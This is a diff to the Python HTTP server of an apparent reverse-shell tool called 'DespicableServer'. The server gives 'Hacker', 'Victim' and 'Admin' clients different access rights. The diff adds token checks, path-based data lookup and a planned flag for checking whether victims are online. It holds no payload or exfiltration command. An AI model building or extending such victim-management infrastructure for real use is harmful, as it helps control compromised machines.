@@ -3,9 +3,10 @@ from reverse_shell.server import ErrorCodes
 import reverse_shell.utils as ut
 from pathlib import Path
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from http import HTTPStatus
+from http import HTTPStatus, HTTPMethod as mth
 from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter, Namespace
 from functools import partial
+from json import dumps
 import sys
 import binascii
 
@@ -30,18 +31,94 @@ class Config:
 
         # ---- Session data
         self.data = self.get_session_data()
+        # Put important parts of the data that need
+        # authentication. Use their request_path
+
+        # This is not complete and is going to be remade in the future
+        self.auth_data = {
+            "/clients": {
+                ut.ClientType.Hacker: [mth.GET, mth.POST],
+                ut.ClientType.Victim: [mth.POST, mth.PATCH],
+                ut.ClientType.Admin: [mth.POST, mth.PATCH, mth.GET, mth.DELETE]
+            }
+        }
+        self.request_data = self.get_request_paths()   # Forgive me for the variable naming. I am terrible at naming variables.
+
+        # ---- Python and response type map
+        self.py_res_type_map = {
+            str: "plain/text",
+            dict: "application/json",
+            list: "application/json"
+        }
 
         # ---- IP and PORT
-        self.port = self.config.port
+        self.port = self.get_port()
         self.ip = self.config.ip
+
+    def get_port(self):
+        """ Verify if the port is between the usable limit. """
+        if 1 <= (port := self.config.port) <= 65535:
+            return port
+        else:
+            ut.log("error", "Port out of range!")
+            sys.exit(ErrorCodes.port_out_of_range)
+
+    def update_request_paths(self):
+        """ Update the request path data. """
+        self.request_data = self.get_request_paths()
+
+    def get_request_paths(self):
+        """ Return the request path version of the configuration data. Returns `None` if the path is not in `self.request_data` """
+        # We will use the method in the Config class for making this usable
+        return self.dict_to_request_path(self.data)
+
+    def get_data_from_path(self, path: str):
+        """ Obtain the data from the path. """
+        try:
+            list_path = self.request_data[path]
+            # Get the data
+            latest_data = self.data
+            for key in list_path:
+                latest_data = latest_data[key]
+            return latest_data
+        except KeyError:
+            return None
+
+    def dict_to_request_path(self, object: dict, parent: str = "/", prev_list_path: list = []):
+        """ A linear(not nested) dictionary with HTTP request path like keys assigned to a special python list that is used to get to data. make sure the parent string has a '/' at the end."""
+
+        # This function is made for recursion so keep that in mind future me!
+        # The object is the dictionary we are going to loop on, the parent is the base before
+        # string path, and the prev is an extension to what the function will produce now
+        final_result = {}
+
+        for key, value in object.items():
+            path_to_key = f"{parent}{key}"
+            # We're gonna set the value to the previous plus the new key
+            # to get to the desired value.
+            current_list_path = [*prev_list_path, key]
+            final_result[path_to_key] = [*prev_list_path, key]
+            if isinstance(value, dict):
+                # If the value is a dictionary then we need to recurse the whole process
+                # Then we store what the recursed function returned and add it to the path_to_string
+                # to be returned
+                result = self.dict_to_request_path(value, parent=f"{path_to_key}/", prev_list_path=current_list_path)
+                final_result = {**final_result, **result}
+        return final_result
 
     def get_session_data(self):
         """ Get the data from our session file if it exists else generate one with the default mockup """
         # Defining the default contents of the data field
         # The data field is not complete, it'll be soon tho
 
+        # This is demo data, used for testing
         default_data_contents = {
-            "victim_specs": {},
+            "clients": {
+                "3414123412513": {
+                    "client-type": ut.ClientType.Admin,
+                    "client-name": "bython"
+                }
+            }
         }
 
         data = self.get_from_session("data")
@@ -124,13 +201,14 @@ class DespicableServer(BaseHTTPRequestHandler):
 
     def __init__(self, config: Config, *args, **kwargs):
         self.configuration = config
+        self.data = config.data
 
         # Initialize the BaseHTTPRequestHandler
         super().__init__(*args, **kwargs)
 
-    def send_unauthorized(self):
-        """ Tell the users they are not authorized """
-        self.send_error(HTTPStatus.UNAUTHORIZED)
+    def my_send_error(self, error_type: HTTPStatus):
+        """ Sends an error and stops execution """
+        self.send_error(error_type)
         self.end_headers()
 
     def is_authorized(self):
@@ -139,40 +217,102 @@ class DespicableServer(BaseHTTPRequestHandler):
 
         # If our authorization header doesn't exist then return false right away
         if authorization_header is None:
-            self.send_unauthorized()
+            self.my_send_error(HTTPStatus.UNAUTHORIZED)
             return False
 
         # Ok so now we have an authorization header. let's make sure that it is
         # indeed our authorization token, but before that we should check that the
         # string the user sent is base64 encrypted. And we know that by trying to decode
-        # the token the user sent us using base64 and if the token doesn't decode successfully
+        # the token using base64 and if the token doesn't decode successfully
         # then it means the token is invalid so we'll return False.
         try:
             decoded_token = ut.decode_token(authorization_header)
         except binascii.Error:
-            self.send_unauthorized()
+            self.my_send_error(HTTPStatus.UNAUTHORIZED)
             return False
 
         # If the token doesn't match our token then return false too
         if decoded_token != self.configuration.auth_token:
-            self.send_unauthorized()
+            self.my_send_error(HTTPStatus.UNAUTHORIZED)
             return False
 
         # If the token passes through all of that then it is indeed our token
         return True
 
+    def get_client_id(self):
+        """ Get the id of the client from it's headers. sends 400 error if no header """
+        if (client_id := self.headers.get("client-id")) is not None:
+            return client_id
+        else:
+            self.my_send_error(HTTPStatus.BAD_REQUEST)
+
+    def get_client_type(self, client_id):
+        """ Get the client type from the configuration data. sends 400 error if it's not found """
+
+        # First obtain the client from the data using it's id if it doesn't
+        # exist, we need to send a 400 error and let the user know he needs
+        # to post his stuff to the server first
+
+        try:
+            # Getting the client type from the clients field in the data config
+            return self.configuration.data["clients"][client_id]["client-type"]
+        except KeyError:
+            # Send the 400 error and get tell the user to get out of here
+            self.my_send_error(HTTPStatus.BAD_REQUEST)
+            return None
+
     def do_GET(self):
         """ Handle our get requests"""
 
-        # First check if we are not authenticated, quit right away
-        if not self.is_authorized():
+        # First check if we are not authenticated or we don't have an id, quit right away
+        # by authenticated I meant: has the necessary tokens, has an ID header, has his
+        # client data stored in the servers database
+        not_authorized = not self.is_authorized()
+        dont_have_id = (client_id := self.get_client_id()) is None
+        client_not_in_data = (client_type := self.get_client_type(client_id)) is None
+        print(client_type, client_id)
+        if not_authorized or dont_have_id or client_not_in_data:
             return
 
+        # The plan is to get the user something from the
+        # data field in our configuration. if the field
+        # the user is looking for doesn't exist then we are going
+        # to send a 404 error else we are going to give the query the
+        # user is asking for. of course we need to check for privileges before
+        # handing the data to the client.
+
+        # Do the magic
+
+        # We will now turn the data to the path like structures
+        # and match that with the user
+
+        # Check if it is valid to GET request this path
+        if mth.GET not in self.configuration.auth_data[self.path][client_type]:
+            self.my_send_error(HTTPStatus.UNAUTHORIZED)
+            return
+
+        # Obtain the data with some magic. just kidding go and read the function
+        sent_data = self.configuration.get_data_from_path(self.path)
+
+        # Check if the user set path exists in the path_data
+        if not sent_data:
+            self.my_send_error(HTTPStatus.NOT_FOUND)
+            return
+
+        # Now finally send the data to the client
+
+        # The binary, json.dumps version of the sent_data
+        # Yup it also works for the string types don't worry
+        final_data = bytes(dumps(sent_data), encoding="utf-8")
+
+        # Do some magic and get the content-type to be sent
         self.send_response(HTTPStatus.OK)
-        self.send_header("Content-Type", "text/html")
+        self.send_header("content-type", self.configuration.py_res_type_map[type(sent_data)])
+        self.send_header("content-length", str(len(final_data)))
         self.end_headers()
 
-        self.wfile.write(bytes("<html><head><title>We are running a server</title></head> <body> <h1> Hello World </h1> </body></html>", "utf-8"))
+        # Sending the data
+        self.wfile.write(final_data)
 
 
 class Session:
@@ -279,6 +419,9 @@ class StartServer:
         parser.add_argument("--session-name", "-sn", type=str, required=False, help="Give this session a name to make it easy to remember(default is the current date)", default=None)
 
         parser.add_argument("--no-session-file", "-nsf", action="store_true", help="If the flag is used, a session file for the current session will not be generated.")
+
+        # NotImplemented yet, but will be soon
+        parser.add_argument("--pulse-check-frequency", "-pcf", required=False, help="Frequency of the server checking the status of the victims for their status(online or offline).")
 
         parser.add_argument("-p", "--port", type=int, required=False, help="The port on which the server runs on.", default=80)
 
